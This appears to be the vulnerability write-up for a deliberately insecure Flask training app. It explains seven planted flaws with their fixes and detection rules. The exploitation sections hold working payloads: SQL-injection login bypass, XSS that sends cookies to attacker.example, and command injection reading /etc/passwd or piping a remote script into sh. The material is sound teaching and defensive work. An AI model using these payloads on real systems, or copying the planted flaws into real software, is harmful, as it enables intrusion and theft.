# VULNERABILITIES.md

Every vulnerability in this app is intentional. This document is the part
judges actually care about — anyone can copy a vulnerable snippet off the
internet; proving you understand *why* it's exploitable, what it costs, and
how you'd fix it is the actual deliverable. Know this document cold before
presenting, because "why does this work" is the first question you'll get.

---

## #1 — SQL Injection in login (`/login`)

**CWE-89** | **OWASP A03:2021 – Injection**

**Root cause:** User-supplied `username`/`password` are concatenated
directly into a SQL string:
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```
The database cannot distinguish injected SQL syntax from data — anything
inside the quotes the attacker controls becomes part of the query structure
if it contains a `'`.

**Exploitation:** Auth bypass without knowing any password:
```
username: admin' --
password: anything
```
The resulting query becomes `... WHERE username = 'admin' --' AND password = '...'`
— everything after `--` is a SQL comment, so the password check never
executes. This logs in as `admin` with zero credential knowledge.

**Impact:** Full authentication bypass as any user, including the admin
account — which, combined with vuln #5, means full account takeover of the
most privileged user in the app.

**Detection:** Database query logs showing SQL comment sequences (`--`,
`#`, `/*`) or boolean/UNION keywords in parameter values that should be
plain strings. A WAF rule matching `'(\s)*(OR|--|#)` in form fields on auth
endpoints catches this specific pattern (and is trivially bypassable by a
more careful attacker — defense in depth matters more than the rule).

**Prevention:** Parameterized queries, always:
```python
cur = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
```
Also: don't store or compare plaintext passwords at all — this app does,
which is a second finding worth noting separately (CWE-256), and password
hashing (bcrypt/argon2) is the actual fix regardless of the injection issue.

---

## #2 — Reflected XSS in search (`/search`)

**CWE-79** | **OWASP A03:2021 – Injection**

**Root cause:** The `q` query parameter is rendered back into the page
using Jinja2's `|safe` filter, which explicitly disables Jinja's default
auto-escaping for that value.

**Exploitation:**
```
/search?q=<script>document.location='https://attacker.example/steal?c='+document.cookie</script>
```
Sent as a link to a logged-in victim, this executes in their browser
session and exfiltrates their session cookie to an attacker-controlled
server.

**Impact:** Session hijacking, credential theft via fake login overlays,
or any action the victim's browser is authorized to perform (CSRF-style
abuse of their session).

**Detection:** WAF/IDS signatures for `<script>`, `onerror=`, `javascript:`
in URL query parameters. Server-side logging of request URLs containing
HTML special characters in parameters that are normally plain text is a
cheap, high-signal detection rule your Mini SOC teammates could implement
directly.

**Prevention:** Remove `|safe`. Jinja2 auto-escapes by default — the
vulnerability exists *only* because `|safe` was added to override that.
For richer output needs, use an allowlist-based sanitizer (e.g. `bleach`),
never blocklist-based filtering (attackers reliably bypass blocklists via
encoding/case tricks).

---

## #3 — Stored XSS in comments (`/comments`)

**CWE-79** | **OWASP A03:2021 – Injection**

**Root cause:** Same missing-escaping pattern as #2, but the payload is
persisted to the database and served to *every visitor* of `/comments`,
not just one victim per crafted link.

**Exploitation:** Post a comment with body
`<script>fetch('https://attacker.example/?c='+document.cookie)</script>`.
Every subsequent visitor to `/comments` — including the admin, if they ever
check the comments page — executes it.

**Impact:** Strictly worse than reflected XSS: no social engineering
needed to get a victim to click a link, it fires on anyone who loads the
page, including privileged users. This is the more dangerous of the two
XSS variants and should be scored/prioritized higher in your report.

**Detection:** Same signatures as #2, but applied at write-time (comment
submission) rather than just read-time — detecting it on write lets you
block storage of the payload instead of just noticing it later.

**Prevention:** Remove `|safe` in `comments.html`. If rich text is a
genuine product requirement, sanitize on write with an allowlist sanitizer
before storage, not just on display — defense in depth, since any other
code path that reads this table later also needs to not re-introduce the
vuln.

---

## #4 — IDOR on profiles (`/profile/<id>`)

**CWE-639: Authorization Bypass Through User-Controlled Key**

**Root cause:** The route trusts the `user_id` path parameter as the sole
basis for which record to return, with no check that the requester is
authenticated as that user (or authenticated at all).

**Exploitation:** `/profile/1`, `/profile/2`, `/profile/3` — just increment
the integer. No auth token, no session, nothing required. This is the
single easiest vuln in the app to automate against: a scanner (yours) can
enumerate the entire user table by iterating IDs.

**Impact:** Mass disclosure of PII (email, bio) for every user in the
system via trivial enumeration. In a real app this is frequently where
"minor" IDOR findings become serious — enumerate IDs, correlate with other
leaked data, and you have a full user database.

**Detection:** A single IP requesting `/profile/N` for many sequential
values of N in a short window is a near-zero-false-positive signature —
legitimate users don't enumerate IDs, they navigate via links to their own
profile.

**Prevention:** Require authentication for the route, and check
`session["user_id"] == user_id` (or an explicit role check for
admin-viewing-any-profile as a deliberate, logged exception) before
returning data.

---

## #5 — Broken access control on admin panel (`/admin`)

**CWE-284: Improper Access Control** / **CWE-285: Improper Authorization**
| **OWASP A01:2021 – Broken Access Control**

**Root cause:** The route checks *authentication* (`"username" in
session`) but never checks *authorization* (`session["is_admin"]`). This is
the single most common real-world access control bug — conflating "is
logged in" with "is allowed to do this."

**Exploitation:** Log in as `alice` (a non-admin seed user) and navigate
directly to `/admin`. The page loads and dumps the full user table,
including which accounts are admins.

**Impact:** Combined with #4, any authenticated low-privilege user gets
full user enumeration including admin status — a reconnaissance goldmine
for an attacker planning to target the admin account specifically (e.g.
via #1's SQLi, or a phishing campaign aimed at a now-identified admin
username).

**Detection:** Any non-admin session reaching `/admin` is a 100%
confidence detection if you log `session["is_admin"]` alongside every
request to privileged routes — this is a cheap, high-value audit log to
build if your Mini SOC project wants a concrete alerting rule tied directly
to this app.

**Prevention:**
```python
if not session.get("is_admin"):
    return "Forbidden", 403
```
More broadly: centralize this as a decorator (`@require_admin`) applied to
every privileged route, rather than repeating the check inline in each
view function — inline checks get forgotten on the next route someone
adds, which is exactly how this class of bug keeps recurring in real
codebases.

---

## #6 — OS Command Injection in ping tool (`/ping`)

**CWE-78: Improper Neutralization of Special Elements used in an OS
Command** | **OWASP A03:2021 – Injection**

**Root cause:** User input is concatenated into a shell command string
executed with `shell=True`, which invokes `/bin/sh -c "..."` — meaning
shell metacharacters in the input are interpreted by the shell, not
treated as a literal hostname.

**Exploitation:**
```
host: 127.0.0.1; cat /etc/passwd
host: 127.0.0.1 && whoami
host: $(curl https://attacker.example/shell.sh | sh)
```
The `;`, `&&`, and `$()` are shell syntax, not part of a hostname — the
shell executes them as separate/chained commands after (or instead of) the
intended `ping`.

**Impact:** Arbitrary command execution as whatever OS user the Flask
process runs as. This is the most severe vulnerability in the app —
everything else leaks data or bypasses a check; this one hands over the
host.

**Detection:** Process-creation monitoring (auditd, Sysmon-equivalent on
Linux) showing a web server process (`python`/`flask`) spawning `sh -c`
with unexpected child processes is a strong signal. At the network layer,
outbound connections initiated from the web server to unexpected
destinations right after a request to `/ping` is another correlation point.

**Prevention:** Never use `shell=True` with any user-influenced string.
Use `subprocess.run(["ping", "-c", "1", host], ...)` with `shell=False` (the
default) and an argument list — this passes `host` as a single literal
argument to the `ping` binary, with no shell interpretation at all. If you
need to validate `host` is a plausible hostname/IP before even reaching
that point, validate against a strict allowlist pattern, not a blocklist.

---

## #7 — Weak secret key / session security

**CWE-798: Use of Hard-coded Credentials** (for the secret key specifically)

**Root cause:** `app.secret_key = "dev-secret-not-for-production"` is
hard-coded, checked into source control, and identical across every
deployment of this code.

**Impact:** Flask signs session cookies with this key. Anyone who knows the
key (anyone who's read this file) can forge arbitrary session cookies —
including one claiming `is_admin: True` — without ever going through
`/login` at all. This is a background vulnerability underlying everything
else: it means #5's broken access control check is moot, because an
attacker with the secret key doesn't need a session from the app, they
mint one.

**Prevention:** Load the secret key from an environment variable or secret
manager, generate it randomly per deployment (`secrets.token_hex(32)`),
and never commit it.

---

## Priority ranking for your report (if asked to rank)

1. **#6 (command injection)** — remote code execution, game over.
2. **#1 (SQLi auth bypass)** — full account takeover including admin.
3. **#7 (hard-coded secret key)** — session forgery, underlies everything.
4. **#5 (broken access control on admin)** — privileged data exposure.
5. **#4 (IDOR)** — mass PII disclosure, trivially automatable.
6. **#3 (stored XSS)** — session hijacking, fires on any visitor.
7. **#2 (reflected XSS)** — session hijacking, requires victim interaction.

Rank by **impact × ease of exploitation**, not by how interesting the bug
class sounds — a judge who knows this field will notice if you rank a
reflected XSS above a remote code execution vector.
